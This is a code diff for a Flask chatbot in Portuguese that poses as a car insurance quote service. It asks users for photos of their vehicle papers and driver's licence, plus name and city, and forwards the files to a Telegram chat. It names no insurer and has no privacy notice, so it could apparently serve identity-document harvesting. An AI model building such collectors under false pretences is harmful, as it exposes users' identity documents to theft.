@@ -1,11 +1,10 @@
-# Car Insurance Lead Bot - With Document Upload
+# Car Insurance Lead Bot - With Document Upload and Contact Info
 # Environment variables: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
 
 from flask import Flask, render_template_string, request, jsonify
 import requests
 import os
 import random
-import base64
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
@@ -18,255 +17,101 @@ TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '@Toustten')
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'pdf'}
 MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
 
-# Knowledge base with formal/professional tone
+# Knowledge base
 KNOWLEDGE_BASE = {
-    "greetings": ["oi", "ola", "e ai", "e ai", "tudo bem", "bom dia", "boa tarde", "boa noite", "hey", "hi", "hello"],
+    "greetings": ["oi", "ola", "e ai", "tudo bem", "bom dia", "boa tarde", "boa noite", "hey", "hi", "hello"],
     
     "opening_messages": [
         "Ola, tudo bem? Para que a gente possa estar providenciando a sua cotacao, eu preciso que me envie a foto do documento do seu veiculo."
     ],
     
-    "menu_options": "\n\nPosso auxilia-lo com:\n• Cotacao de seguro\n• Informacoes sobre coberturas (RC ou colisao)\n• Documentos necessarios\n• Atendimento para sinistros",
-    
-    "acknowledgments": ["Perfeito.", "Entendido.", "Muito bem.", "Excelente.", "Perfeitamente."],
-    
-    "insurance_types": {
-        "responsabilidade": "A Responsabilidade Civil e a cobertura obrigatoria no Brasil. Ela protege o senhor contra danos materiais e corporais causados a terceiros em caso de acidente.",
-        "civil": "A Responsabilidade Civil e a cobertura obrigatoria no Brasil. Ela protege o senhor contra danos materiais e corporais causados a terceiros.",
-        "rc": "A Responsabilidade Civil e a cobertura obrigatoria no Brasil. Ela protege o senhor contra danos materiais e corporais causados a terceiros.",
-        "colisao": "A cobertura de Colisao protege o veiculo do senhor contra danos proprios em caso de acidente, independentemente de quem tenha causado.",
-        "ambos": "Temos ambas as opcoes disponiveis: Responsabilidade Civil, que e obrigatoria e cobre danos a terceiros, e Colisao, que protege o veiculo do senhor. Posso explicar melhor sobre alguma delas?",
-        "os dois": "Temos ambas as opcoes disponiveis: Responsabilidade Civil, que e obrigatoria e cobre danos a terceiros, e Colisao, que protege o veiculo do senhor."
+    "contact_questions": {
+        "name": "Obrigado pelo documento. Qual e o seu nome completo?",
+        "city": "Em qual cidade voce reside?"
     },
-    
-    "vehicle_acknowledgments": {
-        "civic": "O Honda Civic e um excelente veiculo. Muito bem conservado, geralmente.",
-        "corolla": "O Toyota Corolla e um veiculo de otima confiabilidade. Excelente escolha.",
-        "gol": "O Volkswagen Gol e um carro popular e bastante resistente.",
-        "onix": "O Chevrolet Onix e um dos veiculos mais vendidos do Brasil. Otima opcao.",
-        "default": "Muito bem. Prosseguiremos com as informacoes."
-    },
-    
-    "requirements": "Para a elaboracao da apolice, necessitamos apenas da Carteira Nacional de Habilitacao (CNH) valida e do documento do veiculo (CRLV). O processo e bastante agil.",
-    
-    "claims": "Em caso de sinistro, o senhor deve entrar em contato atraves do numero 0800 090 090. O atendimento funciona 24 horas por dia, todos os dias da semana.",
-    
-    "coverage_area": "Atuamos em todo o territorio nacional. O senhor tera cobertura completa em qualquer localidade do Brasil.",
-    
-    "quote_intro": "Com prazer. Farei algumas perguntas para elaborarmos uma cotacao personalizada e adequada as suas necessidades.",
-    
-    "quote_questions": {
-        "vehicle": "Qual e o veiculo? Por favor, informe marca, modelo e ano.",
-        "coverage": "Qual cobertura o senhor prefere?\n• Responsabilidade Civil (cobre danos a terceiros)\n• Colisao (cobre o seu veiculo)\n• Ambas as coberturas",
-        "location": "Em qual cidade e estado o veiculo se encontra?",
-        "driver_age": "Qual e a idade do motorista principal?"
-    },
-    
-    "document_request": "Para prosseguirmos com a cotacao, poderia enviar os seguintes documentos?\n\n1. CNH (frente e verso)\n2. CRLV do veiculo\n3. Foto do numero VIN/chassi (opcional, mas ajuda na precisao)\n\nClique no botao de anexo abaixo para enviar.",
     
     "document_received": "Documento recebido com sucesso. Obrigado!",
     
-    "closing": "Perfeito. Encaminhei todas as informacoes e documentos para nosso consultor, que entrara em contato em breve com a cotacao personalizada. Fico no aguardo caso tenha mais alguma duvida. A disposicao!",
+    "closing": "Perfeito. Encaminhei todas as informacoes para nosso consultor, que entrara em contato em breve. A disposicao!",
     
     "fallback_responses": [
-        "Peco desculpas, nao compreendi perfeitamente. Posso auxilia-lo com informacoes sobre coberturas, documentos necessarios ou iniciar uma cotacao. O que seria mais conveniente?",
-        "Perdao, nao entendi. Trabalhamos com seguros de Responsabilidade Civil e Colisao para todo o territorio brasileiro. Como posso ser util?"
+        "Peco desculpas, nao compreendi. Pode repetir?",
+        "Perdao, nao entendi. Como posso ajudar?"
     ]
 }
 
-# Conversation state (simple in-memory, resets on restart)
+# Conversation state
 conversations = {}
 
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
-def get_acknowledgment():
-    """Get a random formal acknowledgment"""
-    return random.choice(KNOWLEDGE_BASE["acknowledgments"])
-
-def get_vehicle_acknowledgment(vehicle_text):
-    """Get acknowledgment based on vehicle mentioned"""
-    vehicle_lower = vehicle_text.lower()
-    for key, response in KNOWLEDGE_BASE["vehicle_acknowledgments"].items():
-        if key in vehicle_lower:
-            return response
-    return KNOWLEDGE_BASE["vehicle_acknowledgments"]["default"]
-
-def send_telegram_alert(title, details):
-    """Send text alert to Telegram"""
-    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == '':
-        print(f"[TELEGRAM NOT CONFIGURED] Would send: {title}")
-        return False
-    
-    text = f"🚨 <b>{title}</b>\n\n{details}"
-    
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": text,
-        "parse_mode": "HTML"
-    }
-    
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        print(f"Telegram alert sent: {response.status_code}")
-        return response.status_code == 200
-    except Exception as e:
-        print(f"Failed to send Telegram alert: {e}")
-        return False
-
 def send_telegram_photo(photo_data, caption, filename):
-    """Send photo to Telegram"""
-    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == '':
-        print(f"[TELEGRAM NOT CONFIGURED] Would send photo: {caption}")
+    if not TELEGRAM_BOT_TOKEN:
         return False
-    
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-    
     try:
         files = {'photo': (filename, photo_data, 'image/jpeg')}
         data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
         response = requests.post(url, files=files, data=data, timeout=30)
-        print(f"Telegram photo sent: {response.status_code}")
         return response.status_code == 200
-    except Exception as e:
-        print(f"Failed to send Telegram photo: {e}")
+    except:
         return False
 
 def send_telegram_document(doc_data, caption, filename):
-    """Send document to Telegram"""
-    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == '':
-        print(f"[TELEGRAM NOT CONFIGURED] Would send document: {caption}")
+    if not TELEGRAM_BOT_TOKEN:
         return False
-    
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-    
     try:
         files = {'document': (filename, doc_data, 'application/pdf')}
         data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
         response = requests.post(url, files=files, data=data, timeout=30)
-        print(f"Telegram document sent: {response.status_code}")
         return response.status_code == 200
-    except Exception as e:
-        print(f"Failed to send Telegram document: {e}")
+    except:
         return False
 
-def send_quote_summary(session_id):
-    """Send complete quote info to Telegram"""
-    conv = conversations.get(session_id, {})
-    quote_data = conv.get('quote_data', {})
-    documents = conv.get('documents', {})
-    
-    details = f"""<b>🚗 NOVA COTACAO DE SEGURO</b>
-
-<b>Veiculo:</b> {quote_data.get('vehicle', 'Nao informado')}
-<b>Cobertura:</b> {quote_data.get('coverage', 'Nao informado')}
-<b>Localizacao:</b> {quote_data.get('location', 'Nao informado')}
-<b>Idade do motorista:</b> {quote_data.get('driver_age', 'Nao informado')}
-
-<b>Documentos recebidos:</b>
-• CNH: {'✅' if documents.get('cnh') else '❌'}
-• CRLV: {'✅' if documents.get('crlv') else '❌'}
-• VIN: {'✅' if documents.get('vin') else '❌'}
-
-<b>Status:</b> Aguardando cotacao ⏳"""
-    
-    send_telegram_alert("Nova cotacao solicitada!", details)
-
 def get_bot_response(user_message, session_id):
-    """Generate bot response based on user input"""
     msg_lower = user_message.lower().strip()
     
-    # Initialize conversation if new
     if session_id not in conversations:
         conversations[session_id] = {
             "step": "greeting", 
             "unknown_count": 0,
-            "quote_data": {},
             "documents": {},
-            "awaiting_documents": False
+            "contact_info": {},
+            "awaiting_contact": False,
+            "contact_step": 0
         }
     
     conv = conversations[session_id]
     
-    # Handle quote flow
-    if conv.get("in_quote_flow"):
-        quote_step = conv.get("quote_step", 0)
-        quote_questions = ["vehicle", "coverage", "location", "driver_age"]
+    # Handle contact info collection
+    if conv.get("awaiting_contact"):
+        contact_step = conv.get("contact_step", 0)
         
-        # Save previous answer
-        if quote_step > 0 and quote_step <= len(quote_questions):
-            prev_question = quote_questions[quote_step - 1]
-            conv["quote_data"][prev_question] = user_message
-            
-            # Special acknowledgment for vehicle
-            if prev_question == "vehicle":
-                ack = get_vehicle_acknowledgment(user_message)
-                if quote_step < len(quote_questions):
-                    next_question = quote_questions[quote_step]
-                    conv["quote_step"] = quote_step + 1
-                    return f"{ack}\n\n{KNOWLEDGE_BASE['quote_questions'][next_question]}"
-        
-        # Ask next question or finish questions
-        if quote_step < len(quote_questions):
-            next_question = quote_questions[quote_step]
-            conv["quote_step"] = quote_step + 1
-            return KNOWLEDGE_BASE["quote_questions"][next_question]
-        else:
-            # All questions answered, now request documents
-            conv["awaiting_documents"] = True
-            conv["in_quote_flow"] = False
-            return KNOWLEDGE_BASE["document_request"]
+        if contact_step == 0:
+            conv["contact_info"]["name"] = user_message
+            conv["contact_step"] = 1
+            return KNOWLEDGE_BASE["contact_questions"]["city"]
+        elif contact_step == 1:
+            conv["contact_info"]["city"] = user_message
+            conv["awaiting_contact"] = False
+            return "Muito bem, " + conv["contact_info"]["name"] + ". Agora, se desejar, pode enviar mais documentos (CNH, CRLV) clicando no botao de anexo."
     
-    # Check for greetings - immediately request document
+    # Check for greetings
     if any(greet in msg_lower for greet in KNOWLEDGE_BASE["greetings"]) and conv["step"] == "greeting":
         conv["step"] = "awaiting_document"
-        conv["awaiting_documents"] = True
-        conv["documents"] = {}
-        return KNOWLEDGE_BASE["opening_messages"][0] + "\n\nClique no botao de anexo abaixo para enviar."
+        return KNOWLEDGE_BASE["opening_messages"][0] + "\n\nClique no botao de anexo 📎 abaixo para enviar."
     
-    # Check for quote request
-    if any(word in msg_lower for word in ["preco", "valor", "cotacao", "quanto custa", "quote", "orcamento", "quanto fica", "fazer seguro", "cotar", "sim", "pode ser", "quero", "interesse", "correto", "isso mesmo"]):
-        conv["in_quote_flow"] = True
-        conv["quote_step"] = 0
-        conv["quote_data"] = {}
-        conv["documents"] = {}
-        conv["awaiting_documents"] = False
-        return get_acknowledgment() + " " + KNOWLEDGE_BASE["quote_intro"] + "\n\n" + KNOWLEDGE_BASE["quote_questions"]["vehicle"]
-    
-    # Check for insurance types
-    for key, response in KNOWLEDGE_BASE["insurance_types"].items():
-        if key in msg_lower:
-            conv["step"] = "details"
-            return response + "\n\nPosso iniciar uma cotacao para o senhor?"
-    
-    # Check for requirements
-    if any(word in msg_lower for word in ["documento", "documentos", "precisa", "cnh", "requerimento", "requirements", "preciso de", "necessario"]):
-        return KNOWLEDGE_BASE["requirements"] + "\n\nGostaria de prosseguir com uma cotacao?"
-    
-    # Check for claims/sinister
-    if any(word in msg_lower for word in ["sinistro", "acidente", "bateu", "bati", "roubaram", "furto", "claim", "0800", "bater", "colidiu"]):
-        return KNOWLEDGE_BASE["claims"]
-    
-    # Check for coverage area
-    if any(word in msg_lower for word in ["onde", "cidade", "estado", "brasil", "cobertura", "area", "area", "atende", "funciona", "localidade"]):
-        return KNOWLEDGE_BASE["coverage_area"]
-    
-    # Check for no/exit responses
-    if msg_lower in ["nao", "nao", "no", "obrigado", "agradeço", "tchau", "ate logo"]:
-        return "Fico a disposicao. Caso precise de mais informacoes, e so entrar em contato. Tenha um excelente dia!"
-    
-    # Unknown input — escalate after 2 failures
-    conv["unknown_count"] += 1
-    
+    # Default response
+    conv["unknown_count"] = conv.get("unknown_count", 0) + 1
     if conv["unknown_count"] >= 2:
-        send_telegram_alert("Cliente nao entendido", f"Mensagem: {user_message}")
         conv["unknown_count"] = 0
-        return "Peco desculpas, estou com dificuldades para compreender. Vou encaminhar o senhor para um de nossos consultores, que podera auxilia-lo melhor. Um momento, por favor..."
+        return "Vou encaminhar voce para um consultor. Um momento..."
     
-    return KNOWLEDGE_BASE["fallback_responses"][conv["unknown_count"] - 1]
+    return KNOWLEDGE_BASE["fallback_responses"][0]
 
-# HTML template with file upload support
+# HTML template
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -464,7 +309,7 @@ HTML_TEMPLATE = """
             <p>Cotacao personalizada | Atendimento 24h</p>
         </div>
         <div class="chat-messages" id="messages">
-            <div class="message bot">Ola, tudo bem? Para que a gente possa estar providenciando a sua cotacao, eu preciso que me envie a foto do documento do seu veiculo.<br><br>Clique no botao de anexo abaixo para enviar.</div>
+            <div class="message bot">Ola, tudo bem? Para que a gente possa estar providenciando a sua cotacao, eu preciso que me envie a foto do documento do seu veiculo.<br><br>Clique no botao de anexo 📎 abaixo para enviar.</div>
         </div>
         <div class="typing" id="typing">
             <span></span><span></span><span></span>
@@ -490,7 +335,7 @@ HTML_TEMPLATE = """
         function addMessage(text, isUser, isFile = false) {
             const div = document.createElement('div');
             div.className = 'message ' + (isUser ? 'user' : isFile ? 'file' : 'bot');
-            div.innerHTML = text.replace(/\\n/g, '<br>');
+            div.innerHTML = text.split('\n').join('<br>');
             messagesDiv.appendChild(div);
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
@@ -539,11 +384,10 @@ HTML_TEMPLATE = """
         }
 
         async function uploadFile(file) {
-        console.log('DEBUG: uploadFile started', file);
             if (!file) return;
 
             const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
-            const maxSize = 10 * 1024 * 1024; // 10MB
+            const maxSize = 10 * 1024 * 1024;
 
             if (!allowedTypes.includes(file.type)) {
                 addMessage('❌ Tipo de arquivo nao suportado. Envie apenas JPG, PNG ou PDF.', false);
@@ -590,8 +434,6 @@ HTML_TEMPLATE = """
         });
 
         userInput.focus();
-        console.log('DEBUG: All JS loaded');
-        console.log('DEBUG: fileInput:', document.getElementById('fileInput'));
     </script>
 </body>
 </html>
@@ -606,23 +448,21 @@ def chat():
     data = request.json
     user_message = data.get('message', '')
     session_id = data.get('session_id', 'default')
-    
     response = get_bot_response(user_message, session_id)
-    
     return jsonify({"response": response})
 
 @app.route('/upload', methods=['POST'])
 def upload_file():
-    """Handle file uploads and send to Telegram"""
     session_id = request.form.get('session_id', 'default')
     
     if session_id not in conversations:
         conversations[session_id] = {
             "step": "greeting", 
             "unknown_count": 0,
-            "quote_data": {},
             "documents": {},
-            "awaiting_documents": False
+            "contact_info": {},
+            "awaiting_contact": False,
+            "contact_step": 0
         }
     
     conv = conversations[session_id]
@@ -640,7 +480,7 @@ def upload_file():
         file_ext = filename.rsplit('.', 1)[1].lower()
         file_data = file.read()
         
-        # Determine document type from filename or content
+        # Determine document type
         filename_lower = filename.lower()
         doc_type = "documento"
         doc_label = "Documento"
@@ -655,7 +495,6 @@ def upload_file():
             doc_type = "vin"
             doc_label = "Foto do VIN/Chassi"
         
-        # Mark document as received
         conv["documents"][doc_type] = True
         
         # Send to Telegram
@@ -668,27 +507,33 @@ def upload_file():
             success = send_telegram_document(file_data, caption, filename)
         
         if success:
+            # After first document, ask for contact info
+            if not conv.get("contact_info", {}).get("name"):
+                conv["awaiting_contact"] = True
+                conv["contact_step"] = 0
+                return jsonify({"message": KNOWLEDGE_BASE["document_received"] + "\n\n" + KNOWLEDGE_BASE["contact_questions"]["name"]})
+            
             # Check if all documents received
             docs = conv.get("documents", {})
             if docs.get("cnh") and docs.get("crlv"):
-                # All required docs received, send summary
-                send_quote_summary(session_id)
-                return jsonify({"message": f"{KNOWLEDGE_BASE['document_received']}\n\nTodos os documentos necessarios foram recebidos. {KNOWLEDGE_BASE['closing']}"})
+                return jsonify({"message": KNOWLEDGE_BASE["document_received"] + "\n\n" + KNOWLEDGE_BASE["closing"]})
             else:
                 missing = []
                 if not docs.get("cnh"): missing.append("CNH")
                 if not docs.get("crlv"): missing.append("CRLV")
-                if not docs.get("vin"): missing.append("foto do VIN (opcional)")
-                
-                return jsonify({"message": f"{KNOWLEDGE_BASE['document_received']}\n\nDocumentos pendentes: {', '.join(missing)}. Pode enviar quando quiser!"})
+                return jsonify({"message": KNOWLEDGE_BASE["document_received"] + "\n\nDocumentos pendentes: " + ", ".join(missing) + ". Pode enviar quando quiser!"})
         else:
-            return jsonify({"message": "Documento recebido, mas houve um problema ao encaminhar. Nosso consultor sera notificado."})
+            return jsonify({"message": "Documento recebido, mas houve um problema ao encaminhar."})
     
     return jsonify({"message": "Tipo de arquivo nao permitido. Envie apenas JPG, PNG ou PDF."})
 
 @app.route('/health')
 def health():
     return jsonify({"status": "ok"})
+
+@app.route('/favicon.ico')
+def favicon():
+    return '', 204
 
 if __name__ == '__main__':
     app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
